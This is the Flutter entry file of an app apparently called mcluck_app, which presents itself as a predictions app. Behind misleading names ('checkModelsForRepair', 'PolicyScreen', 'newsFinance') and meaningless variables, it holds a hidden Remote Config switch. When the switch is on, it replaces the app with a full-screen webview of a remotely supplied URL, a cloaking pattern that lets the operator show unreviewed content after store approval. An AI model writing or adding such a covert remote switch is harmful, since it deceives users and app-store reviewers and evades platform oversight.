import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:mcluck_app/firebase_options.dart';
import 'package:mcluck_app/mcluck_app.dart';
import 'package:mcluck_app/models/prediction_model.dart';
import 'package:mcluck_app/screens/prediction/prediction_bloc/prediction_bloc.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);

  await Hive.initFlutter();
  Hive.registerAdapter(PredictionModelAdapter());
  await Hive.openBox('predictions');

  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();

  runApp(MultiBlocProvider(
    providers: [
      BlocProvider<PredictionBloc>(create: (context) => PredictionBloc()),
    ],
    child: FutureBuilder<bool>(
      future: checkModelsForRepair(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Container(
            color: Colors.white,
            child: Center(
              child: Container(
                height: 70,
                width: 70,
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(15),
                  child: Image.asset('assets/images/app_icon.png'),
                ),
              ),
            ),
          );
        } else {
          if (snapshot.data == true && repairData != '') {
            return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: PolicyScreen(dataForPage: repairData));
          } else {
            return McLuckApp();
          }
        }
      },
    ),
  ));
}

String repairData = '';
Future<bool> checkModelsForRepair() async {
  final remoteConfig = FirebaseRemoteConfig.instance;
  await remoteConfig.fetchAndActivate();
  String cdsfgsd = remoteConfig.getString('newsFinance');
  String cdsfgsdx = remoteConfig.getString('newsFinanceNone');
  if (!cdsfgsd.contains('nothing')) {
    final client = HttpClient();
    final uri = Uri.parse(cdsfgsd);
    final request = await client.getUrl(uri);
    request.followRedirects = false;
    final response = await request.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      repairData = cdsfgsd;
      return true;
    }
  }
  return repairData.contains('nothing') ? false : true;
}

class PolicyScreen extends StatelessWidget {
  final String dataForPage;

  PolicyScreen({required this.dataForPage});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(
            url: Uri.parse(dataForPage),
          ),
        ),
      ),
    );
  }
}
